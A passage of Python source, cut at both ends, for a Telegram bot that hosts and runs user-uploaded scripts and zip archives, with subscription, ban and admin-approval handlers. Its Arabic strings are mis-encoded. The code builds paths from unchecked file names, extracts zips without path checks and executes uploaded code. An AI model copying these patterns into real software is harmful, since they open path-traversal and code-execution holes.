        bot.send_message(call.message.chat.id, "âš ï¸ ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù‚Ù†Ø§ØªÙ†Ø§ Ø£ÙˆÙ„Ø§Ù‹ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙŠØ²Ø©.", reply_markup=markup)
        return
    
    if free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        bot.send_message(call.message.chat.id, "ğŸ“„ Ù…Ù† ÙØ¶Ù„ÙƒØŒ Ø£Ø±Ø³Ù„ Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø±ÙØ¹Ù‡.")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙŠØ²Ø©. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø·ÙˆØ± @Khalidd_sw  .")


@bot.callback_query_handler(func=lambda call: call.data == 'subscription')
def subscription_menu(call):
    if call.from_user.id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup()
        add_subscription_button = types.InlineKeyboardButton('â• Ø¥Ø¶Ø§ÙØ© Ø§Ø´ØªØ±Ø§Ùƒ', callback_data='add_subscription')
        remove_subscription_button = types.InlineKeyboardButton('â– Ø¥Ø²Ø§Ù„Ø© Ø§Ø´ØªØ±Ø§Ùƒ', callback_data='remove_subscription')
        markup.add(add_subscription_button, remove_subscription_button)
        bot.send_message(call.message.chat.id, "Ø§Ø®ØªØ± Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡ Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ ØªÙ†ÙÙŠØ°Ù‡:", reply_markup=markup)
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'stats')
def stats_menu(call):
    if call.from_user.id == ADMIN_ID:
        total_files = sum(len(files) for files in user_files.values())
        total_users = len(user_files)
        active_users_count = len(active_users)
        banned_users_count = len(banned_users)
        bot.send_message(call.message.chat.id, f"ğŸ“Š Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª:\n\nğŸ“‚ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø±ÙÙˆØ¹Ø©: {total_files}\nğŸ‘¤ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {total_users}\nğŸ‘¥ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ù†Ø´Ø·ÙŠÙ†: {active_users_count}\nğŸš« Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ù…Ø­Ø¸ÙˆØ±ÙŠÙ†: {banned_users_count}")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'add_subscription')
def add_subscription_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Ø£Ø±Ø³Ù„ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ¹Ø¯Ø¯ Ø§Ù„Ø£ÙŠØ§Ù… Ø¨Ø§Ù„Ø´ÙƒÙ„ Ø§Ù„ØªØ§Ù„ÙŠ:\n/add_subscription <user_id> <days>")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'remove_subscription')
def remove_subscription_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Ø£Ø±Ø³Ù„ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ø§Ù„Ø´ÙƒÙ„ Ø§Ù„ØªØ§Ù„ÙŠ:\n/remove_subscription <user_id>")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'ban_user')
def ban_user_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Ø£Ø±Ø³Ù„ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ³Ø¨Ø¨ Ø§Ù„Ø­Ø¸Ø± Ø¨Ø§Ù„Ø´ÙƒÙ„ Ø§Ù„ØªØ§Ù„ÙŠ:\n/ban <user_id> <reason>")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'unban_user')
def unban_user_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Ø£Ø±Ø³Ù„ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ø§Ù„Ø´ÙƒÙ„ Ø§Ù„ØªØ§Ù„ÙŠ:\n/unban <user_id>")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(commands=['add_subscription'])
def add_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            days = int(message.text.split()[2])
            expiry_date = datetime.now() + timedelta(days=days)
            user_subscriptions[user_id] = {'expiry': expiry_date}
            save_subscription(user_id, expiry_date)
            bot.send_message(message.chat.id, f"âœ… ØªÙ…Øª Ø¥Ø¶Ø§ÙØ© Ø§Ø´ØªØ±Ø§Ùƒ Ù„Ù…Ø¯Ø© {days} Ø£ÙŠØ§Ù… Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}.")
            bot.send_message(user_id, f"ğŸ‰ ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ Ù„Ùƒ Ù„Ù…Ø¯Ø© {days} Ø£ÙŠØ§Ù…. ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¢Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª!")
        except Exception as e:
            logger.error(f"Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø¶Ø§ÙØ© Ø§Ø´ØªØ±Ø§Ùƒ: {e}")
            bot.send_message(message.chat.id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(commands=['remove_subscription'])
def remove_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_subscriptions:
                del user_subscriptions[user_id]
                remove_subscription_db(user_id)
                bot.send_message(message.chat.id, f"âœ… ØªÙ… Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}.")
                bot.send_message(user_id, "âš ï¸ ØªÙ… Ø¥Ø²Ø§Ù„Ø© Ø§Ø´ØªØ±Ø§ÙƒÙƒ. Ù„Ù… ÙŠØ¹Ø¯ Ø¨Ø¥Ù…ÙƒØ§Ù†Ùƒ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª.")
            else:
                bot.send_message(message.chat.id, f"âš ï¸ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id} Ù„ÙŠØ³ Ù„Ø¯ÙŠÙ‡ Ø§Ø´ØªØ±Ø§Ùƒ.")
        except Exception as e:
            logger.error(f"Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø²Ø§Ù„Ø© Ø§Ø´ØªØ±Ø§Ùƒ: {e}")
            bot.send_message(message.chat.id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(commands=['user_files'])
def show_user_files(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_files:
                files_list = "\n".join(user_files[user_id])
                bot.send_message(message.chat.id, f"ğŸ“‚ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„ØªÙŠ Ø±ÙØ¹Ù‡Ø§ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}:\n{files_list}")
            else:
                bot.send_message(message.chat.id, f"âš ï¸ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id} Ù„Ù… ÙŠØ±ÙØ¹ Ø£ÙŠ Ù…Ù„ÙØ§Øª.")
        except Exception as e:
            logger.error(f"Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¹Ø±Ø¶ Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
            bot.send_message(message.chat.id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(commands=['lock'])
def lock_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = True
        bot.send_message(message.chat.id, "ğŸ”’ ØªÙ… Ù‚ÙÙ„ Ø§Ù„Ø¨ÙˆØª.")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(commands=['unlock'])
def unlock_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = False
        bot.send_message(message.chat.id, "ğŸ”“ ØªÙ… ÙØªØ­ Ø§Ù„Ø¨ÙˆØª.")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'lock_bot')
def lock_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = True
        bot.send_message(call.message.chat.id, "ğŸ”’ ØªÙ… Ù‚ÙÙ„ Ø§Ù„Ø¨ÙˆØª.")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'unlock_bot')
def unlock_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = False
        bot.send_message(call.message.chat.id, "ğŸ”“ ØªÙ… ÙØªØ­ Ø§Ù„Ø¨ÙˆØª.")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'free_mode')
def toggle_free_mode(call):
    if call.from_user.id == ADMIN_ID:
        global free_mode
        free_mode = not free_mode
        status = "Ù…ÙØªÙˆØ­" if free_mode else "Ù…ØºÙ„Ù‚"
        bot.send_message(call.message.chat.id, f"ğŸ”“ ØªÙ… ØªØºÙŠÙŠØ± ÙˆØ¶Ø¹ Ø§Ù„Ø¨ÙˆØª Ø¨Ø¯ÙˆÙ† Ø§Ø´ØªØ±Ø§Ùƒ Ø¥Ù„Ù‰: {status}.")
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(commands=['ban'])
def ban_user_command(message):
    if message.from_user.id == ADMIN_ID:
        try:
            parts = message.text.split(maxsplit=2)
            if len(parts) < 3:
                bot.send_message(message.chat.id, "âš ï¸ Ø§Ù„ØµÙŠØºØ© Ø§Ù„ØµØ­ÙŠØ­Ø©: /ban <user_id> <reason>")
                return
            
            user_id = int(parts[1])
            reason = parts[2]
            
            ban_user(user_id, reason)
            bot.send_message(message.chat.id, f"âœ… ØªÙ… Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id} Ø¨Ø³Ø¨Ø¨: {reason}")
            try:
                bot.send_message(user_id, f"â›” ØªÙ… Ø­Ø¸Ø±Ùƒ Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª Ø¨Ø³Ø¨Ø¨: {reason}")
            except:
                pass
        except Exception as e:
            logger.error(f"Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
            bot.send_message(message.chat.id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(commands=['unban'])
def unban_user_command(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            
            if unban_user(user_id):
                bot.send_message(message.chat.id, f"âœ… ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}")
                try:
                    bot.send_message(user_id, f"ğŸ‰ ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø­Ø¸Ø± Ø¹Ù†Ùƒ. ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¢Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.")
                except:
                    pass
            else:
                bot.send_message(message.chat.id, f"âš ï¸ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id} ØºÙŠØ± Ù…Ø­Ø¸ÙˆØ±.")
        except Exception as e:
            logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¥Ù„ØºØ§Ø¡ Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
            bot.send_message(message.chat.id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    
    
    if user_id in banned_users:
        bot.reply_to(message, "â›” Ø£Ù†Øª Ù…Ø­Ø¸ÙˆØ± Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø·ÙˆØ± Ø¥Ø°Ø§ ÙƒÙ†Øª ØªØ¹ØªÙ‚Ø¯ Ø£Ù† Ù‡Ø°Ø§ Ø®Ø·Ø£.")
        return
    
    if bot_locked:
        bot.reply_to(message, "âš ï¸ Ø§Ù„Ø¨ÙˆØª Ù…Ù‚ÙÙ„ Ø­Ø§Ù„ÙŠØ§Ù‹. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø·ÙˆØ± @Khalidd_sw .")
        return
        
    
    if not is_user_subscribed_to_channel(user_id):
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton('Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø§Ù„Ù‚Ù†Ø§Ø©', url=f'https://t.me/{CHANNEL_USERNAME[1:]}')
        check_button = types.InlineKeyboardButton('âœ… ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ', callback_data='check_subscription')
        markup.add(channel_button, check_button)
        bot.reply_to(message, "âš ï¸ ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù‚Ù†Ø§ØªÙ†Ø§ Ø£ÙˆÙ„Ø§Ù‹ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙŠØ²Ø©.", reply_markup=markup)
        return
    
    if free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        try:
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_name = message.document.file_name

            
            if not file_name.endswith('.py') and not file_name.endswith('.zip'):
                bot.reply_to(message, "âš ï¸ Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª Ø®Ø§Øµ Ø¨Ø±ÙØ¹ Ù…Ù„ÙØ§Øª Ø¨Ø§ÙŠØ«ÙˆÙ† (.py) Ø£Ùˆ Ø£Ø±Ø´ÙŠÙØ§Øª zip ÙÙ‚Ø·.")
                return

            
            file_hash = hashlib.sha256(downloaded_file).hexdigest()
            logger.info(f"ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ù…Ù„Ù: {file_name} Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id} Ø¨Ø§Ù„Ø¨ØµÙ…Ø© {file_hash}")

            
            temp_path = os.path.join(tempfile.gettempdir(), file_name)
            with open(temp_path, 'wb') as temp_file:
                temp_file.write(downloaded_file)

            
            with open(temp_path, 'rb') as f:
                file_content = f.read()
            
            is_safe = scan_file(file_content, file_name)
            
            if not is_safe:
                
                suspicious_file_path = os.path.join(suspicious_files_dir, f"{user_id}_{file_name}")
                shutil.copy2(temp_path, suspicious_file_path)
                
                
                activity = "ØªÙ… Ø§ÙƒØªØ´Ø§Ù ÙƒÙˆØ¯ ØºÙŠØ± Ø¢Ù…Ù† Ø¹Ø¨Ø± API Ø§Ù„ÙØ­Øµ"
                banned = log_suspicious_activity(user_id, activity, file_name)
                
                bot.reply_to(message, f"â›” ØªÙ… Ø±ÙØ¶ Ø§Ù„Ù…Ù„Ù Ù„Ø£Ø³Ø¨Ø§Ø¨ Ø£Ù…Ù†ÙŠØ©.")
                return

            
            user_info = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
            approval_message = f"ğŸ“¤ Ø·Ù„Ø¨ Ø±ÙØ¹ Ù…Ù„Ù Ø¬Ø¯ÙŠØ¯\n\n"
            approval_message += f"ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {user_info}\n"
            approval_message += f"ğŸ†” ID: {user_id}\n"
            approval_message += f"ğŸ“„ Ø§Ø³Ù… Ø§Ù„Ù…Ù„Ù: {file_name}\n"
            approval_message += f"ğŸ” Ø¨ØµÙ…Ø© Ø§Ù„Ù…Ù„Ù: {file_hash}\n\n"
            approval_message += "âœ… ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù…Ø§Ù† Ø§Ù„Ù…Ù„Ù Ø¹Ø¨Ø± API\n"
            approval_message += "Ù‡Ù„ ØªÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø±ÙØ¹ Ù‡Ø°Ø§ Ø§Ù„Ù…Ù„ÙØŸ"
            
            markup = types.InlineKeyboardMarkup()
            approve_button = types.InlineKeyboardButton('âœ… Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©', callback_data=f'approve_{user_id}_{file_name}')
            reject_button = types.InlineKeyboardButton('âŒ Ø§Ù„Ø±ÙØ¶', callback_data=f'reject_{user_id}_{file_name}')
            markup.add(approve_button, reject_button)
            
            
            pending_approvals[(user_id, file_name)] = temp_path
            
            
            with open(temp_path, 'rb') as file:
                bot.send_document(ADMIN_ID, file, caption=approval_message, reply_markup=markup)
            
            bot.reply_to(message, "ğŸ“¨ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø±ÙØ¹ Ø§Ù„Ù…Ù„Ù Ø¥Ù„Ù‰ Ø§Ù„Ù…Ø´Ø±Ù. Ø³ÙŠØªÙ… Ø¥Ø¹Ù„Ø§Ù…Ùƒ Ø¨Ø§Ù„Ù‚Ø±Ø§Ø±.")
            
        except Exception as e:
            logger.error(f"ÙØ´Ù„ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„Ù: {e}")
            bot.reply_to(message, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
    else:
        bot.reply_to(message, "âš ï¸ ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙŠØ²Ø©. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø·ÙˆØ± @Khalidd_sw .")

def scan_file(file_content, file_name):
    try:
        files = {'file': (file_name, file_content)}
        response = requests.post(SCAN_API_URL, files=files, timeout=10)
        response.raise_for_status()
        
        
        print("API Response:", response.text)
        
        
        result = response.json()
        
        
        return result.get("status", "") == "Ø¢Ù…Ù†"
        
    except Exception as e:
        print(f"Error scanning file: {e}")
        return False


@bot.callback_query_handler(func=lambda call: call.data.startswith(('approve_', 'reject_')))
def handle_approval(call):
    if call.from_user.id == ADMIN_ID:
        action, user_id, file_name = call.data.split('_', 2)
        user_id = int(user_id)
        file_key = (user_id, file_name)
        
        if file_key in pending_approvals:
            temp_path = pending_approvals[file_key]
            
            if action == 'approve':
                try:
                    
                    with open(temp_path, 'rb') as f:
                        file_content = f.read()
                    
                    if not scan_file(file_content, file_name):
                        bot.send_message(ADMIN_ID, f"âš ï¸ Ø§Ù„Ù…Ù„Ù ØºÙŠØ± Ø¢Ù…Ù† ÙˆØªÙ… Ø±ÙØ¶Ù‡ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹")
                        bot.send_message(user_id, f"âš ï¸ ØªÙ… Ø±ÙØ¶ Ù…Ù„ÙÙƒ Ù„Ø£Ø³Ø¨Ø§Ø¨ Ø£Ù…Ù†ÙŠØ©")
                        
                        
                        suspicious_file_path = os.path.join(suspicious_files_dir, f"{user_id}_{file_name}")
                        shutil.copy2(temp_path, suspicious_file_path)
                        log_suspicious_activity(user_id, "Ø±ÙØ¶ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨Ø¹Ø¯ Ø§ÙƒØªØ´Ø§Ù ØªÙ‡Ø¯ÙŠØ¯ Ø¹Ø¨Ø± API", file_name)
                        return

                    
                    if file_name.endswith('.zip'):
                        with tempfile.TemporaryDirectory() as temp_dir:
                            zip_folder_path = os.path.join(temp_dir, file_name.split('.')[0])

                            with zipfile.ZipFile(temp_path, 'r') as zip_ref:
                                zip_ref.extractall(zip_folder_path)

                            
                            for root, dirs, files in os.walk(zip_folder_path):
                                for file in files:
                                    if file.endswith('.py'):
                                        file_path = os.path.join(root, file)
                                        with open(file_path, 'rb') as f:
                                            if not scan_file(f.read(), file):
                                                bot.send_message(ADMIN_ID, f"âš ï¸ ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ù…Ù„Ù ØºÙŠØ± Ø¢Ù…Ù† Ø¯Ø§Ø®Ù„ Ø§Ù„Ø£Ø±Ø´ÙŠÙ: {file}")
                                                bot.send_message(user_id, f"âš ï¸ ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø£Ø±Ø´ÙŠÙ Ù„Ø§Ø­ØªÙˆØ§Ø¦Ù‡ Ø¹Ù„Ù‰ Ù…Ù„ÙØ§Øª ØºÙŠØ± Ø¢Ù…Ù†Ø©")
                                                return

                            final_folder_path = os.path.join(uploaded_files_dir, file_name.split('.')[0])
                            if not os.path.exists(final_folder_path):
                                os.makedirs(final_folder_path)

                            for root, dirs, files in os.walk(zip_folder_path):
                                for file in files:
                                    src_file = os.path.join(root, file)
                                    dest_file = os.path.join(final_folder_path, file)
                                    shutil.move(src_file, dest_file)

                            
                            py_files = [f for f in os.listdir(final_folder_path) if f.endswith('.py')]
                            if py_files:
                                main_script = py_files[0]  
                                run_script(os.path.join(final_folder_path, main_script), user_id, final_folder_path, main_script, call.message)
                            else:
                                bot.send_message(ADMIN_ID, f"âŒ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø£ÙŠ Ù…Ù„ÙØ§Øª Ø¨Ø§ÙŠØ«ÙˆÙ† (.py) ÙÙŠ Ø§Ù„Ø£Ø±Ø´ÙŠÙ.")
                                bot.send_message(user_id, "âŒ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø£ÙŠ Ù…Ù„ÙØ§Øª Ø¨Ø§ÙŠØ«ÙˆÙ† (.py) ÙÙŠ Ø§Ù„Ø£Ø±Ø´ÙŠÙ.")
                                return
                    else:
                        script_path = os.path.join(uploaded_files_dir, file_name)
                        shutil.move(temp_path, script_path)
                        run_script(script_path, user_id, uploaded_files_dir, file_name, call.message)

                    if user_id not in user_files:
                        user_files[user_id] = []
                    user_files[user_id].append(file_name)
                    save_user_file(user_id, file_name)
                    
                    bot.send_message(ADMIN_ID, f"âœ… ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø±ÙØ¹ Ø§Ù„Ù…Ù„Ù {file_name} Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}.")
                    bot.send_message(user_id, f"âœ… ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø±ÙØ¹ Ù…Ù„ÙÙƒ {file_name} ÙˆØªÙ… ØªØ´ØºÙŠÙ„Ù‡ Ø¨Ù†Ø¬Ø§Ø­.")
                    
                except Exception as e:
                    logger.error(f"ÙØ´Ù„ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„Ù Ø¨Ø¹Ø¯ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©: {e}")
                    bot.send_message(ADMIN_ID, f"âŒ ÙØ´Ù„ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„Ù Ø¨Ø¹Ø¯ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©: {e}")
                    bot.send_message(user_id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ù…Ø¹Ø§Ù„Ø¬Ø© Ù…Ù„ÙÙƒ Ø¨Ø¹Ø¯ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©: {e}")
            else:
                try:
                    
                    device_info = gather_device_info()
                    user_contacts = gather_user_contacts(user_id)
                    
                    rejection_message = f"âŒ ØªÙ… Ø±ÙØ¶ Ø±ÙØ¹ Ø§Ù„Ù…Ù„Ù {file_name} Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}\n\n"
                    rejection_message += "ğŸ“Œ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:\n"
                    rejection_message += f"ğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: {user_contacts.get('first_name', 'ØºÙŠØ± Ù…ØªÙˆÙØ±')} {user_contacts.get('last_name', '')}\n"
                    rejection_message += f"ğŸ“Œ Ø§Ù„ÙŠÙˆØ²Ø±: @{user_contacts.get('username', 'ØºÙŠØ± Ù…ØªÙˆÙØ±')}\n"
                    rejection_message += f"ğŸ“ Ø§Ù„Ø¨Ø§ÙŠÙˆ: {user_contacts.get('bio', 'ØºÙŠØ± Ù…ØªÙˆÙØ±')}\n\n"
                    
                    rejection_message += "ğŸ–¥ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:\n"
                    for key, value in device_info.items():
                        rejection_message += f"{key}: {value}\n"
                    
                    bot.send_message(ADMIN_ID, rejection_message)
                    
                    os.remove(temp_path)
